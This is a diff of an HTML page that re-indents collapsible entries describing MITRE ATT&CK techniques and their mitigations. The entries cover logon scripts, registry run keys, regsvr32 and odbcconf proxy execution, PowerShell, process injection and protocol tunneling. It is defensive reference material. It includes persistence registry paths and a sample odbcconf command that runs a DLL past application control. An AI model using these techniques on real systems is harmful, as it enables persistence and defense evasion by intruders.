+                <p>Adversaries may use Windows logon scripts automatically executed at logon initialization to establish persistence. Windows allows logon scripts to be run whenever a specific user or group of users log into a system. This is done via adding a path to a script to the <code>HKCU\Environment\UserInitMprLogonScript</code> Registry key.
 
 Adversaries may use these scripts to maintain persistence on a single system. Depending on the access configuration of the logon scripts, either local credentials or an administrator account may be necessary. </p>
-              <button id="button3" class="collapsible">Mitigations</button>
-                <div class="content">
-                  <p>Restrict Registry Permissions - Restrict the ability to modify certain hives or keys in the Windows Registry.</p>
-                </div>
-            </div>
-          <button id="button2" class="collapsible">User Execution: Malicious File</button>
-            <div class="content">
-              <p>An adversary may rely upon a user opening a malicious file in order to gain execution. Users may be subjected to social engineering to get them to open a file that will lead to code execution. This user action will typically be observed as follow-on behavior from [<a href="https://attack.mitre.org/techniques/T1566/001">Spearphishing Attachment</a>]. Adversaries may use several types of files that require a user to execute them, including .doc, .pdf, .xls, .rtf, .scr, .exe, .lnk, .pif, and .cpl.
+                <button id="button3" class="collapsible">Mitigations</button>
+                  <div class="content">
+                    <p>Restrict Registry Permissions - Restrict the ability to modify certain hives or keys in the Windows Registry.</p>
+                  </div>
+              </div>
+            <button id="button2" class="collapsible">User Execution: Malicious File</button>
+              <div class="content">
+                <p>An adversary may rely upon a user opening a malicious file in order to gain execution. Users may be subjected to social engineering to get them to open a file that will lead to code execution. This user action will typically be observed as follow-on behavior from [<a href="https://attack.mitre.org/techniques/T1566/001">Spearphishing Attachment</a>]. Adversaries may use several types of files that require a user to execute them, including .doc, .pdf, .xls, .rtf, .scr, .exe, .lnk, .pif, and .cpl.
 
 Adversaries may employ various forms of [<a href="https://attack.mitre.org/techniques/T1036">Masquerading</a>] on the file to increase the likelihood that a user will open it.
 
 While [<a href="https://attack.mitre.org/techniques/T1204/002">Malicious File</a>] frequently occurs shortly after Initial Access it may occur at other phases of an intrusion, such as when an adversary places a file in a shared directory or on a user's desktop hoping that a user will click on it. This activity may also be seen shortly after [<a href="https://attack.mitre.org/techniques/T1534">Internal Spearphishing</a>].</p>
-              <button id="button3" class="collapsible">Mitigations</button>
-                <div class="content">
-                  <p>Behavior Prevention on Endpoint - Use capabilities to prevent suspicious behavior patterns from occurring on endpoint systems. This could include suspicious process, file, API call, etc. behavior.</p>
-                  <p>Execution Prevention - Block execution of code on a system through application control, and/or script blocking.</p>
-                  <p>User Training - Train users to be aware of access or manipulation attempts by an adversary to reduce the risk of successful spearphishing, social engineering, and other techniques that involve user interaction.</p>
-                </div>
-            </div>
-          <button id="button2" class="collapsible">User Execution: Malicious Link</button>
-            <div class="content">
-              <p>An adversary may rely upon a user clicking a malicious link in order to gain execution. Users may be subjected to social engineering to get them to click on a link that will lead to code execution. This user action will typically be observed as follow-on behavior from [<a href="https://attack.mitre.org/techniques/T1566/002">Spearphishing Link</a>]. Clicking on a link may also lead to other execution techniques such as exploitation of a browser or application vulnerability via [<a href="https://attack.mitre.org/techniques/T1203">Exploitation for Client Execution</a>]. Links may also lead users to download files that require execution via [<a href="https://attack.mitre.org/techniques/T1204/002">Malicious File</a>].</p>
-              <button id="button3" class="collapsible">Mitigations</button>
-                <div class="content">
-                  <p>Network Intrusion Prevention - Use intrusion detection signatures to block traffic at network boundaries.</p>
-                  <p>Restrict Web-Based Content - Restrict use of certain websites, block downloads/attachments, block Javascript, restrict browser extensions, etc.</p>
-                  <p>User Training - Train users to be aware of access or manipulation attempts by an adversary to reduce the risk of successful spearphishing, social engineering, and other techniques that involve user interaction.</p>
-                </div>
-            </div>
-          <button id="button2" class="collapsible">Network Service Scanning</button>
-            <div class="content">
-              <p>Adversaries may attempt to get a listing of services running on remote hosts, including those that may be vulnerable to remote software exploitation. Methods to acquire this information include port scans and vulnerability scans using tools that are brought onto a system. 
+                <button id="button3" class="collapsible">Mitigations</button>
+                  <div class="content">
+                    <p>Behavior Prevention on Endpoint - Use capabilities to prevent suspicious behavior patterns from occurring on endpoint systems. This could include suspicious process, file, API call, etc. behavior.</p>
+                    <p>Execution Prevention - Block execution of code on a system through application control, and/or script blocking.</p>
+                    <p>User Training - Train users to be aware of access or manipulation attempts by an adversary to reduce the risk of successful spearphishing, social engineering, and other techniques that involve user interaction.</p>
+                  </div>
+              </div>
+            <button id="button2" class="collapsible">User Execution: Malicious Link</button>
+              <div class="content">
+                <p>An adversary may rely upon a user clicking a malicious link in order to gain execution. Users may be subjected to social engineering to get them to click on a link that will lead to code execution. This user action will typically be observed as follow-on behavior from [<a href="https://attack.mitre.org/techniques/T1566/002">Spearphishing Link</a>]. Clicking on a link may also lead to other execution techniques such as exploitation of a browser or application vulnerability via [<a href="https://attack.mitre.org/techniques/T1203">Exploitation for Client Execution</a>]. Links may also lead users to download files that require execution via [<a href="https://attack.mitre.org/techniques/T1204/002">Malicious File</a>].</p>
+                <button id="button3" class="collapsible">Mitigations</button>
+                  <div class="content">
+                    <p>Network Intrusion Prevention - Use intrusion detection signatures to block traffic at network boundaries.</p>
+                    <p>Restrict Web-Based Content - Restrict use of certain websites, block downloads/attachments, block Javascript, restrict browser extensions, etc.</p>
+                    <p>User Training - Train users to be aware of access or manipulation attempts by an adversary to reduce the risk of successful spearphishing, social engineering, and other techniques that involve user interaction.</p>
+                  </div>
+              </div>
+            <button id="button2" class="collapsible">Network Service Scanning</button>
+              <div class="content">
+                <p>Adversaries may attempt to get a listing of services running on remote hosts, including those that may be vulnerable to remote software exploitation. Methods to acquire this information include port scans and vulnerability scans using tools that are brought onto a system. 
 
 Within cloud environments, adversaries may attempt to discover services running on other cloud hosts. Additionally, if the cloud environment is connected to a on-premises environment, adversaries may be able to identify services running on non-cloud systems as well.</p>
-              <button id="button3" class="collapsible">Mitigations</button>
-                <div class="content">
-                  <p>Disable or Remove Feature or Program - Remove or deny access to unnecessary and potentially vulnerable software to prevent abuse by adversaries.</p>
-                  <p>Network Intrusion Prevention - Use intrusion detection signatures to block traffic at network boundaries.</p>
-                  <p>Network Segmentation - Architect sections of the network to isolate critical systems, functions, or resources. Use physical and logical segmentation to prevent access to potentially sensitive systems and information. Use a DMZ to contain any internet-facing services that should not be exposed from the internal network. Configure separate virtual private cloud (VPC) instances to isolate critical cloud systems.</p>
-                </div>
-            </div>
-          <button id="button2" class="collapsible">Obfuscated Files or Information</button>
-            <div class="content">
-              <p>Adversaries may attempt to make an executable or file difficult to discover or analyze by encrypting, encoding, or otherwise obfuscating its contents on the system or in transit. This is common behavior that can be used across different platforms and the network to evade defenses. 
+                <button id="button3" class="collapsible">Mitigations</button>
+                  <div class="content">
+                    <p>Disable or Remove Feature or Program - Remove or deny access to unnecessary and potentially vulnerable software to prevent abuse by adversaries.</p>
+                    <p>Network Intrusion Prevention - Use intrusion detection signatures to block traffic at network boundaries.</p>
+                    <p>Network Segmentation - Architect sections of the network to isolate critical systems, functions, or resources. Use physical and logical segmentation to prevent access to potentially sensitive systems and information. Use a DMZ to contain any internet-facing services that should not be exposed from the internal network. Configure separate virtual private cloud (VPC) instances to isolate critical cloud systems.</p>
+                  </div>
+              </div>
+            <button id="button2" class="collapsible">Obfuscated Files or Information</button>
+              <div class="content">
+                <p>Adversaries may attempt to make an executable or file difficult to discover or analyze by encrypting, encoding, or otherwise obfuscating its contents on the system or in transit. This is common behavior that can be used across different platforms and the network to evade defenses. 
 
 Payloads may be compressed, archived, or encrypted in order to avoid detection. These payloads may be used during Initial Access or later to mitigate detection. Sometimes a user's action may be required to open and [<a href="https://attack.mitre.org/techniques/T1140">Deobfuscate/Decode Files or Information</a>] for [<a href="https://attack.mitre.org/techniques/T1204">User Execution</a>]. The user may also be required to input a password to open a password protected compressed/encrypted file that was provided by the adversary.  Adversaries may also used compressed or archived scripts, such as JavaScript. 
 
 Portions of files can also be encoded to hide the plain-text strings that would otherwise help defenders with discovery.  Payloads may also be split into separate, seemingly benign files that only reveal malicious functionality when reassembled. 
 
 Adversaries may also obfuscate commands executed from payloads or directly via a [<a href="https://attack.mitre.org/techniques/T1059">Command and Scripting Interpreter</a>]. Environment variables, aliases, characters, and other platform/language specific semantics can be used to evade signature based detections and application control mechanisms.   </p>
-              <button id="button3" class="collapsible">Mitigations</button>
-                <div class="content">
-                  <p>Antivirus/Antimalware - Use signatures or heuristics to detect malicious software.</p>
-                  <p>Behavior Prevention on Endpoint - Use capabilities to prevent suspicious behavior patterns from occurring on endpoint systems. This could include suspicious process, file, API call, etc. behavior.</p>
-                </div>
-            </div>
-          <button id="button2" class="collapsible">Signed Binary Proxy Execution: Odbcconf</button>
-            <div class="content">
-              <p>Adversaries may abuse odbcconf.exe to proxy execution of malicious payloads. Odbcconf.exe is a Windows utility that allows you to configure Open Database Connectivity (ODBC) drivers and data source names. Odbcconf.exe is digitally signed by Microsoft.
+                <button id="button3" class="collapsible">Mitigations</button>
+                  <div class="content">
+                    <p>Antivirus/Antimalware - Use signatures or heuristics to detect malicious software.</p>
+                    <p>Behavior Prevention on Endpoint - Use capabilities to prevent suspicious behavior patterns from occurring on endpoint systems. This could include suspicious process, file, API call, etc. behavior.</p>
+                  </div>
+              </div>
+            <button id="button2" class="collapsible">Signed Binary Proxy Execution: Odbcconf</button>
+              <div class="content">
+                <p>Adversaries may abuse odbcconf.exe to proxy execution of malicious payloads. Odbcconf.exe is a Windows utility that allows you to configure Open Database Connectivity (ODBC) drivers and data source names. Odbcconf.exe is digitally signed by Microsoft.
 
 Adversaries may abuse odbcconf.exe to bypass application control solutions that do not account for its potential abuse. Similar to [<a href="https://attack.mitre.org/techniques/T1218/010">Regsvr32</a>], odbcconf.exe has a <code>REGSVR</code> flag that can be misused to execute DLLs (ex: <code>odbcconf.exe /S /A &lbrace;REGSVR "C:\Users\Public\file.dll"&rbrace;</code>).  
 </p>
-              <button id="button3" class="collapsible">Mitigations</button>
-                <div class="content">
-                  <p>Disable or Remove Feature or Program - Remove or deny access to unnecessary and potentially vulnerable software to prevent abuse by adversaries.</p>
-                  <p>Execution Prevention - Block execution of code on a system through application control, and/or script blocking.</p>
-                </div>
-            </div>
-          <button id="button2" class="collapsible">Command and Scripting Interpreter: PowerShell</button>
-            <div class="content">
-              <p>Adversaries may abuse PowerShell commands and scripts for execution. PowerShell is a powerful interactive command-line interface and scripting environment included in the Windows operating system.  Adversaries can use PowerShell to perform a number of actions, including discovery of information and execution of code. Examples include the <code>Start-Process</code> cmdlet which can be used to run an executable and the <code>Invoke-Command</code> cmdlet which runs a command locally or on a remote computer (though administrator permissions are required to use PowerShell to connect to remote systems).
+                <button id="button3" class="collapsible">Mitigations</button>
+                  <div class="content">
+                    <p>Disable or Remove Feature or Program - Remove or deny access to unnecessary and potentially vulnerable software to prevent abuse by adversaries.</p>
+                    <p>Execution Prevention - Block execution of code on a system through application control, and/or script blocking.</p>
+                  </div>
+              </div>
+            <button id="button2" class="collapsible">Command and Scripting Interpreter: PowerShell</button>
+              <div class="content">
+                <p>Adversaries may abuse PowerShell commands and scripts for execution. PowerShell is a powerful interactive command-line interface and scripting environment included in the Windows operating system.  Adversaries can use PowerShell to perform a number of actions, including discovery of information and execution of code. Examples include the <code>Start-Process</code> cmdlet which can be used to run an executable and the <code>Invoke-Command</code> cmdlet which runs a command locally or on a remote computer (though administrator permissions are required to use PowerShell to connect to remote systems).
 
 PowerShell may also be used to download and run executables from the Internet, which can be executed from disk or in memory without touching disk.
 
 A number of PowerShell-based offensive testing tools are available, including [<a href="https://attack.mitre.org/software/S0363">Empire</a>],  [<a href="https://attack.mitre.org/software/S0194">PowerSploit</a>], [<a href="https://attack.mitre.org/software/S0378">PoshC2</a>], and PSAttack.
 
 PowerShell commands/scripts can also be executed without directly invoking the <code>powershell.exe</code> binary through interfaces to PowerShell's underlying <code>System.Management.Automation</code> assembly DLL exposed through the .NET framework and Windows Common Language Interface (CLI). </p>
-              <button id="button3" class="collapsible">Mitigations</button>
-                <div class="content">
-                  <p>Antivirus/Antimalware - Use signatures or heuristics to detect malicious software.</p>
-                  <p>Code Signing - Enforce binary and application integrity with digital signature verification to prevent untrusted code from executing.</p>
-                  <p>Disable or Remove Feature or Program - Remove or deny access to unnecessary and potentially vulnerable software to prevent abuse by adversaries.</p>
-                  <p>Execution Prevention - Block execution of code on a system through application control, and/or script blocking.</p>
-                  <p>Privileged Account Management - Manage the creation, modification, use, and permissions associated to privileged accounts, including SYSTEM and root.</p>
-                </div>
-            </div>
-          <button id="button2" class="collapsible">Process Injection</button>
-            <div class="content">
-              <p>Adversaries may inject code into processes in order to evade process-based defenses as well as possibly elevate privileges. Process injection is a method of executing arbitrary code in the address space of a separate live process. Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via process injection may also evade detection from security products since the execution is masked under a legitimate process. 
+                <button id="button3" class="collapsible">Mitigations</button>
+                  <div class="content">
+                    <p>Antivirus/Antimalware - Use signatures or heuristics to detect malicious software.</p>
+                    <p>Code Signing - Enforce binary and application integrity with digital signature verification to prevent untrusted code from executing.</p>
+                    <p>Disable or Remove Feature or Program - Remove or deny access to unnecessary and potentially vulnerable software to prevent abuse by adversaries.</p>
+                    <p>Execution Prevention - Block execution of code on a system through application control, and/or script blocking.</p>
+                    <p>Privileged Account Management - Manage the creation, modification, use, and permissions associated to privileged accounts, including SYSTEM and root.</p>
+                  </div>
+              </div>
+            <button id="button2" class="collapsible">Process Injection</button>
+              <div class="content">
+                <p>Adversaries may inject code into processes in order to evade process-based defenses as well as possibly elevate privileges. Process injection is a method of executing arbitrary code in the address space of a separate live process. Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via process injection may also evade detection from security products since the execution is masked under a legitimate process. 
 
 There are many different ways to inject code into a process, many of which abuse legitimate functionalities. These implementations exist for every major OS but are typically platform specific. 
 
 More sophisticated samples may perform multiple process injections to segment modules and further evade detection, utilizing named pipes or other inter-process communication (IPC) mechanisms as a communication channel. </p>
-              <button id="button3" class="collapsible">Mitigations</button>
-                <div class="content">
-                  <p>Behavior Prevention on Endpoint - Use capabilities to prevent suspicious behavior patterns from occurring on endpoint systems. This could include suspicious process, file, API call, etc. behavior.</p>
-                  <p>Privileged Account Management - Manage the creation, modification, use, and permissions associated to privileged accounts, including SYSTEM and root.</p>
-                </div>
-            </div>
-          <button id="button2" class="collapsible">Protocol Tunneling</button>
-            <div class="content">
-              <p>Adversaries may tunnel network communications to and from a victim system within a separate protocol to avoid detection/network filtering and/or enable access to otherwise unreachable systems. Tunneling involves explicitly encapsulating a protocol within another. This behavior may conceal malicious traffic by blending in with existing traffic and/or provide an outer layer of encryption (similar to a VPN). Tunneling could also enable routing of network packets that would otherwise not reach their intended destination, such as SMB, RDP, or other traffic that would be filtered by network appliances or not routed over the Internet. 
+                <button id="button3" class="collapsible">Mitigations</button>
+                  <div class="content">
+                    <p>Behavior Prevention on Endpoint - Use capabilities to prevent suspicious behavior patterns from occurring on endpoint systems. This could include suspicious process, file, API call, etc. behavior.</p>
+                    <p>Privileged Account Management - Manage the creation, modification, use, and permissions associated to privileged accounts, including SYSTEM and root.</p>
+                  </div>
+              </div>
+            <button id="button2" class="collapsible">Protocol Tunneling</button>
+              <div class="content">
+                <p>Adversaries may tunnel network communications to and from a victim system within a separate protocol to avoid detection/network filtering and/or enable access to otherwise unreachable systems. Tunneling involves explicitly encapsulating a protocol within another. This behavior may conceal malicious traffic by blending in with existing traffic and/or provide an outer layer of encryption (similar to a VPN). Tunneling could also enable routing of network packets that would otherwise not reach their intended destination, such as SMB, RDP, or other traffic that would be filtered by network appliances or not routed over the Internet. 
 
 There are various means to encapsulate a protocol within another protocol. For example, adversaries may perform SSH tunneling (also known as SSH port forwarding), which involves forwarding arbitrary data over an encrypted SSH tunnel. 
 
 [<a href="https://attack.mitre.org/techniques/T1572">Protocol Tunneling</a>] may also be abused by adversaries during [<a href="https://attack.mitre.org/techniques/T1568">Dynamic Resolution</a>]. Known as DNS over HTTPS (DoH), queries to resolve C2 infrastructure may be encapsulated within encrypted HTTPS packets. 
 
 Adversaries may also leverage [<a href="https://attack.mitre.org/techniques/T1572">Protocol Tunneling</a>] in conjunction with [<a href="https://attack.mitre.org/techniques/T1090">Proxy</a>] and/or [<a href="https://attack.mitre.org/techniques/T1001/003">Protocol Impersonation</a>] to further conceal C2 communications and infrastructure. </p>
-              <button id="button3" class="collapsible">Mitigations</button>
-                <div class="content">
-                  <p>Filter Network Traffic - Use network appliances to filter ingress or egress traffic and perform protocol-based filtering. Configure software on endpoints to filter network traffic.</p>
-                  <p>Network Intrusion Prevention - Use intrusion detection signatures to block traffic at network boundaries.</p>
-                </div>
-            </div>
-          <button id="button2" class="collapsible">Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder</button>
-            <div class="content">
-              <p>Adversaries may achieve persistence by adding a program to a startup folder or referencing it with a Registry run key. Adding an entry to the "run keys" in the Registry or startup folder will cause the program referenced to be executed when a user logs in.  These programs will be executed under the context of the user and will have the account's associated permissions level.
+                <button id="button3" class="collapsible">Mitigations</button>
+                  <div class="content">
+                    <p>Filter Network Traffic - Use network appliances to filter ingress or egress traffic and perform protocol-based filtering. Configure software on endpoints to filter network traffic.</p>
+                    <p>Network Intrusion Prevention - Use intrusion detection signatures to block traffic at network boundaries.</p>
+                  </div>
+              </div>
+            <button id="button2" class="collapsible">Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder</button>
+              <div class="content">
+                <p>Adversaries may achieve persistence by adding a program to a startup folder or referencing it with a Registry run key. Adding an entry to the "run keys" in the Registry or startup folder will cause the program referenced to be executed when a user logs in.  These programs will be executed under the context of the user and will have the account's associated permissions level.
 
 Placing a program within a startup folder will also cause that program to execute when a user logs in. There is a startup folder location for individual user accounts as well as a system-wide startup folder that will be checked regardless of which user account logs in. The startup folder path for the current user is <code>C:\Users\\[Username]\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup</code>. The startup folder path for all users is <code>C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp</code>.
 
@@ -375,167 +379,167 @@ Programs listed in the load value of the registry key <code>HKEY_CURRENT_USER\So
 By default, the multistring <code>BootExecute</code> value of the registry key <code>HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager</code> is set to <code>autocheck autochk *</code>. This value causes Windows, at startup, to check the file-system integrity of the hard disks if the system has been shut down abnormally. Adversaries can add other programs or processes to this registry value which will automatically launch at boot.
 
 Adversaries can use these configuration locations to execute malware, such as remote access tools, to maintain persistence through system reboots. Adversaries may also use [<a href="https://attack.mitre.org/techniques/T1036">Masquerading</a>] to make the Registry entries look as if they are associated with legitimate programs.</p>
-            </div>
-          <button id="button2" class="collapsible">Signed Binary Proxy Execution: Regsvr32</button>
-            <div class="content">
-              <p>Adversaries may abuse Regsvr32.exe to proxy execution of malicious code. Regsvr32.exe is a command-line program used to register and unregister object linking and embedding controls, including dynamic link libraries (DLLs), on Windows systems. Regsvr32.exe is also a Microsoft signed binary. 
+              </div>
+            <button id="button2" class="collapsible">Signed Binary Proxy Execution: Regsvr32</button>
+              <div class="content">
+                <p>Adversaries may abuse Regsvr32.exe to proxy execution of malicious code. Regsvr32.exe is a command-line program used to register and unregister object linking and embedding controls, including dynamic link libraries (DLLs), on Windows systems. Regsvr32.exe is also a Microsoft signed binary. 
 
 Malicious usage of Regsvr32.exe may avoid triggering security tools that may not monitor execution of, and modules loaded by, the regsvr32.exe process because of allowlists or false positives from Windows using regsvr32.exe for normal operations. Regsvr32.exe can also be used to specifically bypass application control using functionality to load COM scriptlets to execute DLLs under user permissions. Since Regsvr32.exe is network and proxy aware, the scripts can be loaded by passing a uniform resource locator (URL) to file on an external Web server as an argument during invocation. This method makes no changes to the Registry as the COM object is not actually registered, only executed.  This variation of the technique is often referred to as a "Squiblydoo" attack and has been used in campaigns targeting governments.  
 
 Regsvr32.exe can also be leveraged to register a COM Object used to establish persistence via [<a href="https://attack.mitre.org/techniques/T1546/015">Component Object Model Hijacking</a>]. </p>
-              <button id="button3" class="collapsible">Mitigations</button>
-                <div class="content">
-                  <p>Exploit Protection - Use capabilities to detect and block conditions that may lead to or be indicative of a software exploit occurring.</p>
-                </div>
-            </div>
-          <button id="button2" class="collapsible">Remote Access Software</button>
-            <div class="content">
-              <p>An adversary may use legitimate desktop support and remote access software, such as Team Viewer, Go2Assist, LogMein, AmmyyAdmin, etc, to establish an interactive command and control channel to target systems within networks. These services are commonly used as legitimate technical support software, and may be allowed by application control within a target environment. Remote access tools like VNC, Ammyy, and Teamviewer are used frequently when compared with other legitimate software commonly used by adversaries. 
+                <button id="button3" class="collapsible">Mitigations</button>
+                  <div class="content">
+                    <p>Exploit Protection - Use capabilities to detect and block conditions that may lead to or be indicative of a software exploit occurring.</p>
+                  </div>
+              </div>
+            <button id="button2" class="collapsible">Remote Access Software</button>
+              <div class="content">
+                <p>An adversary may use legitimate desktop support and remote access software, such as Team Viewer, Go2Assist, LogMein, AmmyyAdmin, etc, to establish an interactive command and control channel to target systems within networks. These services are commonly used as legitimate technical support software, and may be allowed by application control within a target environment. Remote access tools like VNC, Ammyy, and Teamviewer are used frequently when compared with other legitimate software commonly used by adversaries. 
 
 Remote access tools may be established and used post-compromise as alternate communications channel for redundant access or as a way to establish an interactive remote desktop session with the target system. They may also be used as a component of malware to establish a reverse connection or back-connect to a service or adversary controlled system.
 
 Admin tools such as TeamViewer have been used by several groups targeting institutions in countries of interest to the Russian state and criminal campaigns.  </p>
-              <button id="button3" class="collapsible">Mitigations</button>
-                <div class="content">
-                  <p>Execution Prevention - Block execution of code on a system through application control, and/or script blocking.</p>
-                  <p>Filter Network Traffic - Use network appliances to filter ingress or egress traffic and perform protocol-based filtering. Configure software on endpoints to filter network traffic.</p>
-                  <p>Network Intrusion Prevention - Use intrusion detection signatures to block traffic at network boundaries.</p>
-                </div>
-            </div>
-          <button id="button2" class="collapsible">Remote Services: Remote Desktop Protocol</button>
-            <div class="content">
-              <p>Adversaries may use [<a href="https://attack.mitre.org/techniques/T1078">Valid Accounts</a>] to log into a computer using the Remote Desktop Protocol (RDP). The adversary may then perform actions as the logged-on user.
+                <button id="button3" class="collapsible">Mitigations</button>
+                  <div class="content">
+                    <p>Execution Prevention - Block execution of code on a system through application control, and/or script blocking.</p>
+                    <p>Filter Network Traffic - Use network appliances to filter ingress or egress traffic and perform protocol-based filtering. Configure software on endpoints to filter network traffic.</p>
+                    <p>Network Intrusion Prevention - Use intrusion detection signatures to block traffic at network boundaries.</p>
+                  </div>
+              </div>
+            <button id="button2" class="collapsible">Remote Services: Remote Desktop Protocol</button>
+              <div class="content">
+                <p>Adversaries may use [<a href="https://attack.mitre.org/techniques/T1078">Valid Accounts</a>] to log into a computer using the Remote Desktop Protocol (RDP). The adversary may then perform actions as the logged-on user.
 
 Remote desktop is a common feature in operating systems. It allows a user to log into an interactive session with a system desktop graphical user interface on a remote system. Microsoft refers to its implementation of the Remote Desktop Protocol (RDP) as Remote Desktop Services (RDS). 
 
 Adversaries may connect to a remote system over RDP/RDS to expand access if the service is enabled and allows access to accounts with known credentials. Adversaries will likely use Credential Access techniques to acquire credentials to use with RDP. Adversaries may also use RDP in conjunction with the [<a href="https://attack.mitre.org/techniques/T1546/008">Accessibility Features</a>] technique for Persistence.</p>
-              <button id="button3" class="collapsible">Mitigations</button>
-                <div class="content">
-                  <p>Audit - Perform audits or scans of systems, permissions, insecure software, insecure configurations, etc. to identify potential weaknesses.</p>
-                  <p>Disable or Remove Feature or Program - Remove or deny access to unnecessary and potentially vulnerable software to prevent abuse by adversaries.</p>
-                  <p>Limit Access to Resource Over Network - Prevent access to file shares, remote access to systems, unnecessary services. Mechanisms to limit access may include use of network concentrators, RDP gateways, etc.</p>
-                  <p>Multi-factor Authentication - Use two or more pieces of evidence to authenticate to a system; such as username and password in addition to a token from a physical smart card or token generator.</p>
-                  <p>Network Segmentation - Architect sections of the network to isolate critical systems, functions, or resources. Use physical and logical segmentation to prevent access to potentially sensitive systems and information. Use a DMZ to contain any internet-facing services that should not be exposed from the internal network. Configure separate virtual private cloud (VPC) instances to isolate critical cloud systems.</p>
-                  <p>Operating System Configuration - Make configuration changes related to the operating system or a common feature of the operating system that result in system hardening against techniques.</p>
-                  <p>Privileged Account Management - Manage the creation, modification, use, and permissions associated to privileged accounts, including SYSTEM and root.</p>
-                  <p>User Account Management - Manage the creation, modification, use, and permissions associated to user accounts.</p>
-                </div>
-            </div>
-          <button id="button2" class="collapsible">Scheduled Task/Job: Scheduled Task</button>
-            <div class="content">
-              <p>Adversaries may abuse the Windows Task Scheduler to perform task scheduling for initial or recurring execution of malicious code. There are multiple ways to access the Task Scheduler in Windows. The <code>schtasks</code> can be run directly on the command line, or the Task Scheduler can be opened through the GUI within the Administrator Tools section of the Control Panel. In some cases, adversaries have used a .NET wrapper for the Windows Task Scheduler, and alternatively, adversaries have used the Windows netapi32 library to create a scheduled task.
+                <button id="button3" class="collapsible">Mitigations</button>
+                  <div class="content">
+                    <p>Audit - Perform audits or scans of systems, permissions, insecure software, insecure configurations, etc. to identify potential weaknesses.</p>
+                    <p>Disable or Remove Feature or Program - Remove or deny access to unnecessary and potentially vulnerable software to prevent abuse by adversaries.</p>
+                    <p>Limit Access to Resource Over Network - Prevent access to file shares, remote access to systems, unnecessary services. Mechanisms to limit access may include use of network concentrators, RDP gateways, etc.</p>
+                    <p>Multi-factor Authentication - Use two or more pieces of evidence to authenticate to a system; such as username and password in addition to a token from a physical smart card or token generator.</p>
+                    <p>Network Segmentation - Architect sections of the network to isolate critical systems, functions, or resources. Use physical and logical segmentation to prevent access to potentially sensitive systems and information. Use a DMZ to contain any internet-facing services that should not be exposed from the internal network. Configure separate virtual private cloud (VPC) instances to isolate critical cloud systems.</p>
+                    <p>Operating System Configuration - Make configuration changes related to the operating system or a common feature of the operating system that result in system hardening against techniques.</p>
+                    <p>Privileged Account Management - Manage the creation, modification, use, and permissions associated to privileged accounts, including SYSTEM and root.</p>
+                    <p>User Account Management - Manage the creation, modification, use, and permissions associated to user accounts.</p>
+                  </div>
+              </div>
+            <button id="button2" class="collapsible">Scheduled Task/Job: Scheduled Task</button>
+              <div class="content">
+                <p>Adversaries may abuse the Windows Task Scheduler to perform task scheduling for initial or recurring execution of malicious code. There are multiple ways to access the Task Scheduler in Windows. The <code>schtasks</code> can be run directly on the command line, or the Task Scheduler can be opened through the GUI within the Administrator Tools section of the Control Panel. In some cases, adversaries have used a .NET wrapper for the Windows Task Scheduler, and alternatively, adversaries have used the Windows netapi32 library to create a scheduled task.
 
 The deprecated [<a href="https://attack.mitre.org/software/S0110">at</a>] utility could also be abused by adversaries (ex: [<a href="https://attack.mitre.org/techniques/T1053/002">At (Windows)</a>]), though <code>at.exe</code> can not access tasks created with <code>schtasks</code> or the Control Panel.
 
 An adversary may use Windows Task Scheduler to execute programs at system startup or on a scheduled basis for persistence. The Windows Task Scheduler can also be abused to conduct remote Execution as part of Lateral Movement and or to run a process under the context of a specified account (such as SYSTEM).</p>
-              <button id="button3" class="collapsible">Mitigations</button>
-                <div class="content">
-                  <p>Audit - Perform audits or scans of systems, permissions, insecure software, insecure configurations, etc. to identify potential weaknesses.</p>
-                  <p>Operating System Configuration - Make configuration changes related to the operating system or a common feature of the operating system that result in system hardening against techniques.</p>
-                  <p>Privileged Account Management - Manage the creation, modification, use, and permissions associated to privileged accounts, including SYSTEM and root.</p>
-                  <p>User Account Management - Manage the creation, modification, use, and permissions associated to user accounts.</p>
-                </div>
-            </div>
-          <button id="button2" class="collapsible">Software Discovery: Security Software Discovery</button>
-            <div class="content">
-              <p>Adversaries may attempt to get a listing of security software, configurations, defensive tools, and sensors that are installed on a system or in a cloud environment. This may include things such as firewall rules and anti-virus. Adversaries may use the information from [<a href="https://attack.mitre.org/techniques/T1518/001">Security Software Discovery</a>] during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.
+                <button id="button3" class="collapsible">Mitigations</button>
+                  <div class="content">
+                    <p>Audit - Perform audits or scans of systems, permissions, insecure software, insecure configurations, etc. to identify potential weaknesses.</p>
+                    <p>Operating System Configuration - Make configuration changes related to the operating system or a common feature of the operating system that result in system hardening against techniques.</p>
+                    <p>Privileged Account Management - Manage the creation, modification, use, and permissions associated to privileged accounts, including SYSTEM and root.</p>
+                    <p>User Account Management - Manage the creation, modification, use, and permissions associated to user accounts.</p>
+                  </div>
+              </div>
+            <button id="button2" class="collapsible">Software Discovery: Security Software Discovery</button>
+              <div class="content">
+                <p>Adversaries may attempt to get a listing of security software, configurations, defensive tools, and sensors that are installed on a system or in a cloud environment. This may include things such as firewall rules and anti-virus. Adversaries may use the information from [<a href="https://attack.mitre.org/techniques/T1518/001">Security Software Discovery</a>] during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.
 
 Example commands that can be used to obtain security software information are [<a href="https://attack.mitre.org/software/S0108">netsh</a>], <code>reg query</code> with [<a href="https://attack.mitre.org/software/S0075">Reg</a>], <code>dir</code> with [<a href="https://attack.mitre.org/software/S0106">cmd</a>], and [<a href="https://attack.mitre.org/software/S0057">Tasklist</a>], but other indicators of discovery behavior may be more specific to the type of software or security system the adversary is looking for. It is becoming more common to see macOS malware perform checks for LittleSnitch and KnockKnock software.
 
 Adversaries may also utilize cloud APIs to discover the configurations of firewall rules within an environment.</p>
-            </div>
-          <button id="button2" class="collapsible">Phishing: Spearphishing Attachment</button>
-            <div class="content">
